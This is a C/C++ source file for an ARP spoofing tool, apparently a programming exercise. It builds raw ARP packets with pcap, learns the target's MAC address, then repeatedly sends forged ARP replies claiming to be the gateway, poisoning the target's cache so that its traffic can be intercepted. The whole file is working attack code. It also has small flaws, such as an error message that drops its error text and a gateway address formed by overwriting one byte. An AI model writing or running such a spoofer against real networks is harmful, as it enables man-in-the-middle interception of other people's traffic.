//to 2019.08.05
#include "arp_spoofing.h"
void usage() {
    printf("syntax: send_arp <interface> <sender ip> <target ip>\n");
    printf("sample: send_arp wlan0 192.168.10.2 192.168.10.1\n");
}

int main(int argc, char* argv[]) {
    if (argc != 4) {
        usage();
        return -1;
    }
    int s,i;
    char check = 'n';
    u_int32_t sendIp = splitIP(argv[2]);
    u_int32_t targetIp = splitIP(argv[3]);

    char* dev = argv[1];
    struct je_arp_header* arp_header = reinterpret_cast<je_arp_header*>(malloc(sizeof(je_arp_header)));
    struct ifreq ifr;
    s = socket(AF_INET, SOCK_DGRAM, 0);
    strcpy(ifr.ifr_name, dev);
    ioctl(s, SIOCGIFHWADDR, &ifr);

    u_char mac[6] = {0};
    for (i=0; i<6; i++)
        mac[i] = (u_char)ifr.ifr_hwaddr.sa_data[i];

    char errbuf[PCAP_ERRBUF_SIZE];

    pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
    if (handle == nullptr) {
        fprintf(stderr, "couldn't open device %s: %s\n", dev, errbuf);
        return -1;
    }

    u_char arpSendPacket[sizeof (je_arp_header)] = {0};

    //makeArpPacket(arpSendPacket, mac, sendIp, targetIp);

    //make arpPacket
    //set ethernet_broadcast
    arpSendPacket[0] = 0xff;
    arpSendPacket[1] = 0xff;
    arpSendPacket[2] = 0xff;
    arpSendPacket[3] = 0xff;
    arpSendPacket[4] = 0xff;
    arpSendPacket[5] = 0xff;
    //host_Mac_IP
    arpSendPacket[6]  = mac[0];
    arpSendPacket[7]  = mac[1];
    arpSendPacket[8]  = mac[2];
    arpSendPacket[9]  = mac[3];
    arpSendPacket[10] = mac[4];
    arpSendPacket[11] = mac[5];
    //arp_type
    arpSendPacket[12] = 0x08;
    arpSendPacket[13] = 0x06;
    //arp hdr
    arpSendPacket[14] = 0x00;
    arpSendPacket[15] = 0x01;
    arpSendPacket[16] = 0x08;
    arpSendPacket[17] = 0x00;
    arpSendPacket[18] = 0x06;
    arpSendPacket[19] = 0x04;
    arpSendPacket[20] = 0x00;
    arpSendPacket[21] = 0x01;
    //senderMac
    arpSendPacket[22] = mac[0];
    arpSendPacket[23] = mac[1];
    arpSendPacket[24] = mac[2];
    arpSendPacket[25] = mac[3];
    arpSendPacket[26] = mac[4];
    arpSendPacket[27] = mac[5];
    //senderIP
    arpSendPacket[28] = (sendIp & 0xff000000) >> 24;
    arpSendPacket[29] = (sendIp & 0x00ff0000) >> 16;
    arpSendPacket[30] = (sendIp & 0x0000ff00) >> 8;
    arpSendPacket[31] = (sendIp & 0x000000ff);
    //targeterMAc
    arpSendPacket[32] = 0x00;
    arpSendPacket[33] = 0x00;
    arpSendPacket[34] = 0x00;
    arpSendPacket[35] = 0x00;
    arpSendPacket[36] = 0x00;
    arpSendPacket[37] = 0x00;

    //targeterIP
    arpSendPacket[38] = (targetIp & 0xff000000) >> 24;
    arpSendPacket[39] = (targetIp & 0x00ff0000) >> 16;
    arpSendPacket[40] = (targetIp & 0x0000ff00) >> 8;
    arpSendPacket[41] = (targetIp & 0x000000ff);

    if (pcap_sendpacket(handle, arpSendPacket, sizeof (je_arp_header)) != 0)
    {
        fprintf(stderr,"\nError sending the packet: \n", pcap_geterr(handle));
        return -1;
    }

    while (true) {
        struct pcap_pkthdr* header;
        const u_char* packet;
        int res = pcap_next_ex(handle, &header, &packet);
        if (res == 0) continue;
        if (res == -1 || res == -2) break;

        packetInsert(const_cast<u_char*>(packet), &arp_header);
        if(arp_header->eth_hdr.ether_type == ETHERTYPE_ARP){
            if(arp_header->arp_hdr.ar_op == ARPOP_REPLY){
//                printfPacket(packet, header->caplen);
                if(arp_header->sender_ip_addr.s_addr == targetIp){
//                    printfJeArpInfo(arp_header);
                    //set targeter mac
                    for (int z = 0; z < 6; z++){
                        arpSendPacket[z] = arp_header->eth_hdr.ether_shost[z];
                    }
                    arpSendPacket[21] = 0x02;
                    //i'm gateway
                    arpSendPacket[31] = 0x01;
                    //set senderer mac
                    for (int z = 0; z < 6; z++){
                        arpSendPacket[32 + z] = arp_header->sender_mac[z] ;
                    }
                    break;
                }
            }
        }
        // printf("%u bytes captured\n", header->caplen);
    }

    for (i = 0; i < 30; i++) {
        if (pcap_sendpacket(handle, arpSendPacket, sizeof (je_arp_header)) != 0)
        {
            fprintf(stderr,"\nError sending the packet: \n", pcap_geterr(handle));
            return -1;
        }
        if(i == 29){
            printf("more?(y|n)");
            scanf(" %c", &check);
            if(check != 'n'){
                i = 0;
                check = 'n';
            }
        }
    }
    pcap_close(handle);
    free(arp_header);
    return 0;
}
